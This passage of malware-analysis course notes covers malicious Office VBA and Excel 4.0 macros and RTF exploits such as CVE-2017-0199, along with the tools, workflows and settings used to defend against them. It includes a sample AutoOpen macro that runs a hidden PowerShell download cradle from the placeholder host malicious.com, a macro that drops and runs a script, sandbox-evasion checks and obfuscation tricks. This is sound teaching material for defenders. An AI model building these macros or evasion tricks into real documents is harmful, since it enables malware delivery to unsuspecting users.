| `AutoExec()` | Runs automatically |

### 5.6 Malicious Macro Techniques

#### PowerShell Download Cradle

```vba
' Educational example - common attack pattern
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -ep bypass -w hidden -c " & _
          "IEX(New-Object Net.WebClient).DownloadString" & _
          "('http://malicious.com/payload.ps1')"
    Shell cmd, vbHide
End Sub
```

#### WScript Execution

```vba
' Creates and executes JScript file
Sub Document_Open()
    Dim fso, file
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set file = fso.CreateTextFile("C:\Users\Public\mal.js")
    file.WriteLine "// malicious JavaScript code"
    file.Close
    Shell "wscript C:\Users\Public\mal.js"
End Sub
```

#### Environment Evasion

```vba
' Checking for sandbox/analysis environment
Function IsAnalysis() As Boolean
    ' Check for low RAM (sandboxes often have limited resources)
    If Application.MemoryFree < 1000000 Then
        IsAnalysis = True
        Exit Function
    End If

    ' Check for VM artifacts
    If Environ("COMPUTERNAME") = "SANDBOX" Then
        IsAnalysis = True
        Exit Function
    End If

    IsAnalysis = False
End Function
```

### 5.7 Obfuscation Techniques in Macros

#### String Obfuscation

```vba
' Using Chr() to build strings
Dim cmd As String
cmd = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & _
      Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)
' Builds: "powershell"

' String concatenation
Dim s1, s2, s3
s1 = "pow"
s2 = "ersh"
s3 = "ell"
' Combined: "powershell"

' StrReverse
cmd = StrReverse("llehsrewop")
' Result: "powershell"
```

#### Variable Name Obfuscation

```vba
' Meaningless variable names
Dim OOOOOOO0O As String
Dim O0O0O0O0O As Object
```

#### Control Flow Obfuscation

```vba
' Dead code and jumps
Sub Confusing()
    GoTo LabelA
LabelB:
    MaliciousCode
    Exit Sub
LabelC:
    ' Never executed
    Exit Sub
LabelA:
    GoTo LabelB
End Sub
```

### 5.8 Office Document Analysis Tools

| Tool | Description |
|------|-------------|
| **olevba** | Extract and analyze VBA macros |
| **oledump.py** | Analyze OLE files |
| **oletools** | Suite of tools for OLE analysis |
| **ViperMonkey** | VBA emulation engine |
| **XLMMacroDeobfuscator** | Analyze Excel 4.0 macros |

#### Using olevba

```bash
# Basic analysis
olevba malicious.doc

# Output shows:
# - VBA macro code
# - Suspicious keywords
# - IOCs (URLs, IPs)
# - Auto-execution triggers

# Example output:
# +----------+--------------------+---------------------------------------------+
# |Type      |Keyword             |Description                                  |
# +----------+--------------------+---------------------------------------------+
# |AutoExec  |AutoOpen            |Runs when the Word document is opened       |
# |Suspicious|Shell               |May run an executable file or a system cmd  |
# |Suspicious|powershell          |May run PowerShell commands                  |
# |Suspicious|DownloadFile        |May download files from the Internet        |
# |IOC       |http://malicious.com|URL                                          |
# +----------+--------------------+---------------------------------------------+
```

### 5.9 Excel 4.0 Macros (XLM)

> **Note**: Excel 4.0 macros are a legacy feature that attackers abuse because they're less detected than VBA macros.

#### Characteristics

- Stored in hidden sheets
- Formula-based, not VBA
- Can execute commands
- Often heavily obfuscated

#### Common Malicious Functions

| Function | Purpose |
|----------|---------|
| `=EXEC()` | Execute command |
| `=CALL()` | Call Windows API |
| `=REGISTER()` | Register DLL function |
| `=FORMULA()` | Create formulas dynamically |
| `=GOTO()` | Control flow |
| `=IF()` | Conditional execution |

### 5.10 Office Document Analysis Methodology

```
┌─────────────────────────────────────────────────────────┐
│            OFFICE DOCUMENT ANALYSIS WORKFLOW             │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  1. INITIAL ASSESSMENT                                   │
│     ├── Identify file type and format                   │
│     ├── Calculate file hashes                           │
│     └── Check VirusTotal/sandbox reports               │
│                          ↓                               │
│  2. STRUCTURE EXTRACTION                                 │
│     ├── For OOXML: Unzip and examine XML               │
│     ├── For OLE: Use oledump.py                        │
│     └── Identify streams and objects                   │
│                          ↓                               │
│  3. MACRO EXTRACTION                                     │
│     ├── Use olevba to extract VBA                      │
│     ├── Check for Excel 4.0 macros                     │
│     └── Identify auto-execution triggers               │
│                          ↓                               │
│  4. CODE ANALYSIS                                        │
│     ├── De-obfuscate code                              │
│     ├── Identify malicious functionality              │
│     └── Extract IOCs (URLs, commands)                  │
│                          ↓                               │
│  5. DYNAMIC ANALYSIS (Optional)                          │
│     ├── Execute in sandbox                              │
│     ├── Monitor network and file activity              │
│     └── Capture dropped files                           │
│                          ↓                               │
│  6. DOCUMENTATION                                        │
│     ├── Write analysis report                           │
│     ├── Document TTPs                                   │
│     └── Share IOCs                                       │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 5.11 Protection Against Office Malware

#### Group Policy Settings

```
┌─────────────────────────────────────────────────────────┐
│          RECOMMENDED OFFICE SECURITY SETTINGS            │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  Block macros from Internet:                             │
│  └── Enable "Block macros from running in Office        │
│       files from the Internet"                           │
│                                                          │
│  Protected View:                                         │
│  └── Enable for files from Internet, Outlook, unsafe    │
│                                                          │
│  Disable macros by default:                              │
│  └── "Disable all macros with notification"             │
│                                                          │
│  Block specific file types:                              │
│  └── Block .docm, .xlsm, .pptm from external sources   │
│                                                          │
│  Attack Surface Reduction:                               │
│  └── "Block Office applications from creating           │
│       child processes"                                   │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

#### User Best Practices

1. **Never enable macros** in documents from unknown sources
2. **Verify sender** before opening attachments
3. **Use Protected View** for all external documents
4. **Report suspicious documents** to security team
5. **Keep Office updated** with latest patches

---

## 6. Analyzing Malicious RTF Document Files

### 6.1 Understanding RTF Format

> **Definition**: **Rich Text Format (RTF)** is a document file format developed by Microsoft that supports text formatting and is readable across different word processors.

#### RTF Characteristics

| Feature | Description |
|---------|-------------|
| **Text-based** | Human-readable format |
| **Cross-platform** | Works on any system with RTF support |
| **Legacy format** | Older but still widely used |
| **Complex specification** | Many features for attackers to abuse |

### 6.2 RTF File Structure

```
{\rtf1\ansi\deff0                          % Header
{\fonttbl{\f0 Times New Roman;}}           % Font table
{\colortbl;\red0\green0\blue0;}            % Color table
\pard                                       % Paragraph reset
Hello World                                 % Content
}                                          % End of document
```

#### Key Components

| Component | Description |
|-----------|-------------|
| `\rtf1` | RTF version identifier |
| `\ansi` | Character set |
| `{\fonttbl...}` | Font definitions |
| `{\colortbl...}` | Color definitions |
| `\object` | Embedded OLE object |
| `{\*\objemb}` | Embedded object marker |

### 6.3 CVE-2017-0199: Major RTF Vulnerability

> **Definition**: **CVE-2017-0199** is a critical security vulnerability discovered in 2017 that allows remote code execution through specially crafted RTF documents.

#### Vulnerability Details

| Aspect | Information |
|--------|-------------|
| **CVE ID** | CVE-2017-0199 |
| **Discovered** | 2017 |
| **Patched** | April 11, 2017 (MS17-014) |
| **CVSS Score** | 7.8 (High) |
| **Attack Vector** | Local (requires user interaction) |

#### How CVE-2017-0199 Works

```
┌─────────────────────────────────────────────────────────┐
│            CVE-2017-0199 EXPLOITATION FLOW               │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  1. RTF document contains embedded OLE object           │
│     └── Object references external URL                  │
│                          ↓                               │
│  2. When document opens, Word/WordPad processes OLE    │
│     └── Fetches remote HTA file                        │
│                          ↓                               │
│  3. HTA file contains malicious script                 │
│     └── VBScript or JavaScript code                    │
│                          ↓                               │
│  4. Script executes via mshta.exe                      │
│     └── Downloads and runs payload                     │
│                          ↓                               │
│  5. Full system compromise                              │
│     └── Malware installed, C2 established              │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 6.4 Common RTF Attack Techniques

#### 6.4.1 OLE Object Embedding

```rtf
{\rtf1
{\object\objocx
{\*\objclass htmlfile}
{\*\objdata ... (hex-encoded malicious content) ...}
}
}
```

#### 6.4.2 Equation Editor Exploits

Exploits targeting `EQNEDT32.EXE`:
- CVE-2017-11882
- CVE-2018-0802

These vulnerabilities allow code execution through malformed equation objects.

#### 6.4.3 Document Properties Abuse

```rtf
{\rtf1
{\*\datafield
00000000 (hex shellcode) ...
}
}
```

### 6.5 RTF Obfuscation Techniques

#### Hex Encoding

```rtf
% Normal: \objdata
% Obfuscated: \'5c\'6f\'62\'6a\'64\'61\'74\'61
```

#### Whitespace Injection

```rtf
% Normal: \objocx
% Obfuscated: \obj        ocx (extra spaces)
```

#### Control Word Fragmentation

```rtf
% Normal: \object
% Obfuscated: \ob
ject (split across lines)
```

#### Nested Groups

```rtf
{{{{\object}}}{{{\objdata}}}}
```

### 6.6 RTF Analysis Tools

| Tool | Description |
|------|-------------|
| **rtfobj** | Extract embedded objects from RTF |
| **rtfdump.py** | Analyze RTF structure |
| **oletools** | General OLE/RTF analysis |
| **Didier Stevens' tools** | Various RTF analysis utilities |

#### Using rtfobj

```bash
# Extract objects from RTF
rtfobj malicious.rtf

# Output shows:
# - Embedded objects
# - Object types (OLE, packages)
# - Extracted file information
# - Potential malicious indicators
```

#### Using rtfdump.py

```bash
# Analyze RTF structure
python rtfdump.py malicious.rtf

# List all groups and control words
python rtfdump.py -f O malicious.rtf

# Extract specific element
python rtfdump.py -s 5 -H malicious.rtf
```

### 6.7 RTF Analysis Methodology

```
┌─────────────────────────────────────────────────────────┐
│               RTF ANALYSIS WORKFLOW                      │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  1. INITIAL TRIAGE                                       │
│     ├── Confirm RTF format (check magic bytes)          │
│     ├── Calculate hashes                                 │
│     └── Check threat intelligence                       │
│                          ↓                               │
│  2. STRUCTURE ANALYSIS                                   │
│     ├── Use rtfdump.py to view structure               │
│     ├── Identify suspicious control words              │
│     │   (object, objdata, objocx)                      │
│     └── Note obfuscation techniques                    │
│                          ↓                               │
│  3. OBJECT EXTRACTION                                    │
│     ├── Use rtfobj to extract embedded objects         │
│     ├── Identify object types                          │
│     └── Extract for further analysis                   │
│                          ↓                               │
│  4. PAYLOAD ANALYSIS                                     │
│     ├── Analyze extracted OLE objects                  │
│     ├── Decode shellcode if present                    │
│     └── Identify C2 infrastructure                     │
│                          ↓                               │
│  5. BEHAVIORAL ANALYSIS (VM)                            │
│     ├── Execute in sandbox                              │
│     ├── Monitor network connections                    │
│     └── Track process creation                          │
│                          ↓                               │
│  6. REPORT AND SHARE                                     │
│     ├── Document findings                               │
│     ├── Extract IOCs                                    │
│     └── Share with community                            │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 6.8 Indicators of Malicious RTF

| Indicator | Description |
|-----------|-------------|
| `\object` | Embedded OLE object |
| `\objocx` | ActiveX control |
| `\objdata` | Object data stream |
| `\objupdate` | Auto-update on open |
| `\objlink` | Linked object (external resource) |
| `\equation` | Equation editor object (exploit target) |
| **Large hex blocks** | Embedded shellcode or exploits |
| **Obfuscated control words** | Attempt to evade detection |

### 6.9 Protection Against RTF Exploits

#### Microsoft Office Settings

```
┌─────────────────────────────────────────────────────────┐
│           RTF PROTECTION MEASURES                        │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  1. Disable RTF in Trust Center:                        │
│     File → Options → Trust Center → Trust Center        │
│     Settings → File Block Settings → RTF Files          │
│                                                          │
│  2. Protected View for RTF:                              │
│     Enable "Open in Protected View for RTF"             │
│                                                          │
│  3. Disable Equation Editor:                             │
│     Unregister or remove EQNEDT32.EXE                   │
│                                                          │
│  4. Apply all security patches:                          │
│     MS17-014 (CVE-2017-0199)                            │
│     KB4011604 (CVE-2017-11882)                           │
│                                                          │
│  5. Email filtering:                                     │
│     Block RTF attachments at gateway                    │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

---

## 7. Summary and Key Takeaways

### 7.1 Defense-in-Depth Approach

```
┌─────────────────────────────────────────────────────────┐
│              LAYERED SECURITY MODEL                      │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  ┌───────────────────────────────────────────────────┐  │
│  │           LAYER 1: PERIMETER SECURITY             │  │
│  │  ├── Email filtering (block malicious files)     │  │
│  │  ├── Web filtering (block malicious URLs)        │  │
│  │  └── IDS/IPS (detect exploit attempts)           │  │
│  └───────────────────────────────────────────────────┘  │
│                          ↓                               │
│  ┌───────────────────────────────────────────────────┐  │
│  │           LAYER 2: ENDPOINT SECURITY              │  │
│  │  ├── Antivirus/EDR                               │  │
│  │  ├── Application whitelisting                    │  │
│  │  └── Regular patching                            │  │
│  └───────────────────────────────────────────────────┘  │
│                          ↓                               │
│  ┌───────────────────────────────────────────────────┐  │
│  │           LAYER 3: APPLICATION SECURITY           │  │
│  │  ├── Disable macros by default                   │  │
│  │  ├── Protected View enabled                       │  │
│  │  └── JavaScript disabled in PDF readers          │  │
│  └───────────────────────────────────────────────────┘  │
│                          ↓                               │
│  ┌───────────────────────────────────────────────────┐  │
│  │           LAYER 4: USER AWARENESS                 │  │
│  │  ├── Security training                            │  │
│  │  ├── Phishing simulations                         │  │
│  │  └── Incident reporting procedures               │  │
│  └───────────────────────────────────────────────────┘  │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 7.2 Quick Reference: File Type Threats

| File Type | Primary Threats | Key Analysis Tools |
|-----------|-----------------|-------------------|
| **Websites/HTML** | XSS, Malicious JS, Phishing | Browser DevTools, Burp Suite |
| **JavaScript** | Obfuscated downloaders, Keyloggers | de4js, JStillery, Chrome DevTools |
| **PDF** | JavaScript, Embedded files, Links | pdfid.py, pdf-parser.py, peepdf |
| **Office (.docx/.xlsx)** | VBA Macros, XLM Macros | olevba, oledump.py, ViperMonkey |
| **RTF** | OLE Objects, Equation exploits | rtfobj, rtfdump.py, oletools |

### 7.3 Essential Analysis Commands

```bash
# PDF Analysis
python pdfid.py suspicious.pdf
python pdf-parser.py --search javascript suspicious.pdf

# Office Document Analysis
olevba suspicious.docm
python oledump.py suspicious.doc

# RTF Analysis
rtfobj suspicious.rtf
python rtfdump.py suspicious.rtf

# General hash calculation
sha256sum suspicious.file
md5sum suspicious.file

# VirusTotal CLI lookup
vt file suspicious.file
```

### 7.4 Remember: The Multi-Layered Approach

1. **Use multiple security layers** - No single solution is sufficient
2. **Keep software updated** - Patch management is critical
3. **Monitor systems regularly** - Detect anomalies early
4. **Stay educated about threats** - Threat landscape evolves constantly
5. **Follow security best practices** - Principle of least privilege

---

## 8. References and Further Reading

### Tools and Resources

- **Didier Stevens Suite**: https://blog.didierstevens.com/
- **oletools**: https://github.com/decalage2/oletools
- **peepdf**: https://github.com/jesparza/peepdf
- **Malzilla**: http://malzilla.sourceforge.net/

### Learning Resources

- SANS FOR610: Reverse-Engineering Malware
- Practical Malware Analysis (book)
- VirusTotal Intelligence
- ANY.RUN Interactive Sandbox

### Threat Intelligence

- MITRE ATT&CK Framework
- VirusTotal
- URLhaus
- PhishTank
- AlienVault OTX

---

## Tags

#REMA #MalwareAnalysis #ReverseEngineering #JavaScript #PDF #Office #RTF #WebSecurity #Unit3

---

> **Note**: This material is for educational purposes in the context of cybersecurity defense and malware analysis. Always conduct analysis in isolated environments and follow responsible disclosure practices.
